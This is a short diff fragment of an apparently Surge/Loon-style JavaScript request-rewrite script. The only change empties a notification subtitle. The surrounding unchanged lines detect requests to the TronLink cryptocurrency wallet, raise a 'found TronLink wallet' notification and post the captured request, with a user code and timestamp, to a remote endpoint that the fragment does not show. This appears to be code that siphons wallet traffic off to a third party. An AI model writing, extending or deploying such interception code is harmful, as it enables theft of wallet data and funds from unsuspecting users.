@@ -17,7 +17,7 @@ if (TronLinkRegex.test(requrl)) {
         body:[request,{"usercode":usercode,"startTime":startTime}],//仅仅在post请求中有效
     }
     console.log("1111111111");
-    $notification.post("通知","subtitle","找到TronLink钱包");
+    $notification.post("通知","","找到TronLink钱包");
     $httpClient.post(params, function(errormsg,response,data){})
 } else {
     $done({});
